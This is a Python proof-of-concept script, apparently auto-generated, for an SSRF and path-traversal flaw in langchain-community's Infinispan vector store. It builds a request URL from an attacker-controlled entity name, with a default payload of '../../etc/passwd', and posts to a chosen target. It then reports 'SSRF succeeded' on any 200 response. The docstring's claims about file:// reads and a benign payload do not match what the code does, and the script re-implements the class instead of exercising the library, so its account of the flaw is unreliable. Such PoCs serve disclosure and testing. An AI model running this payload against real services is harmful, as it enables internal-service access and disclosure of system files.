#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: ssrf-010
# Sink: schema_post
# Auto-generated — run with: python3 ssrf_sink_function_schema_post_schema_post.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via path traversal in langchain-community InfinispanVS.

Vulnerability: The `schema_post` method constructs a URL from `self._default_node`
and `name` (which is `self._entity_name + '.proto'`). If an attacker can control
`_entity_name` (e.g., via constructor arguments), they can inject path traversal
or special characters to manipulate the URL, potentially reaching internal services.
The response is returned to the caller, enabling reflective SSRF.

This PoC simulates an attacker controlling `_entity_name` to perform path traversal
and read a local file (e.g., /etc/passwd) via an internal HTTP service (e.g., a
file:// URL or internal HTTP server). For safety, we use a benign payload that
attempts to reach a local file via file:// protocol (which requests does not support)
or an internal HTTP endpoint. We'll use a simple internal HTTP server simulation.

Usage:
    python3 poc_ssrf_infinispan.py [--target http://internal.service:8080] [--entity_name ../../etc/passwd]
"""

import argparse
import requests
import sys
import json
from typing import Optional

# Default target (simulated internal service)
DEFAULT_TARGET = "http://127.0.0.1:9999"
DEFAULT_ENTITY_NAME = "../../etc/passwd"  # Path traversal payload


class Infinispan:
    """
    Simplified version of the vulnerable Infinispan class.
    Only includes the methods needed to demonstrate the SSRF.
    """

    def __init__(self, default_node: str, entity_name: str):
        """
        Initialize with attacker-controlled entity_name.
        :param default_node: Base URL of the Infinispan server (e.g., http://localhost:11222)
        :param entity_name: Attacker-controlled name used in URL construction
        """
        self._default_node = default_node
        self._entity_name = entity_name
        self._schema_url = "/rest/v2/schemas"  # Typical Infinispan schema endpoint

    def schema_post(self, name: str, proto: str) -> requests.Response:
        """
        Sink function: constructs URL from base + schema_url + '/' + name.
        No validation on name allows path traversal.
        """
        api_url = self._default_node + self._schema_url + "/" + name
        print(f"[*] Constructed URL: {api_url}")
        # Send POST with proto as body
        response = requests.post(api_url, data=proto, timeout=10)
        return response

    def schema_create(self, proto: str) -> requests.Response:
        """
        Middle function: calls schema_post with self._entity_name + '.proto'.
        """
        name = self._entity_name + ".proto"
        print(f"[*] Schema name (with .proto): {name}")
        return self.schema_post(name, proto)

    def configure(self, metadata: dict, dimension: int) -> requests.Response:
        """
        Entry point: builds a protobuf schema from metadata and calls schema_create.
        """
        # Simplified schema builder (just returns metadata as JSON string for demo)
        proto = json.dumps(metadata)
        print(f"[*] Proto body: {proto}")
        return self.schema_create(proto)


def main():
    parser = argparse.ArgumentParser(description="SSRF PoC for langchain-community InfinispanVS")
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target base URL (default: {DEFAULT_TARGET})",
    )
    parser.add_argument(
        "--entity_name",
        default=DEFAULT_ENTITY_NAME,
        help=f"Entity name with path traversal (default: {DEFAULT_ENTITY_NAME})",
    )
    args = parser.parse_args()

    # Validate target URL
    if not args.target.startswith(("http://", "https://")):
        print("[!] Target must start with http:// or https://")
        sys.exit(1)

    print("[*] Starting SSRF PoC")
    print(f"[*] Target base URL: {args.target}")
    print(f"[*] Entity name (with traversal): {args.entity_name}")

    # Create vulnerable instance with attacker-controlled entity_name
    ispn = Infinispan(default_node=args.target, entity_name=args.entity_name)

    # Simulate attacker-controlled metadata (proto body)
    metadata = {"field": "value"}

    try:
        # Trigger the SSRF via configure -> schema_create -> schema_post
        response = ispn.configure(metadata=metadata, dimension=128)
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body (first 500 chars): {response.text[:500]}")
        if response.status_code == 200:
            print("[+] SSRF succeeded! Response contains data from internal service.")
        else:
            print("[*] SSRF may have failed (expected if no internal service at that path).")
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error: {e}")
        print("[*] This is expected if the target URL is not reachable.")
    except requests.exceptions.Timeout:
        print("[!] Request timed out.")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

    print("[*] PoC completed.")


if __name__ == "__main__":
    main()
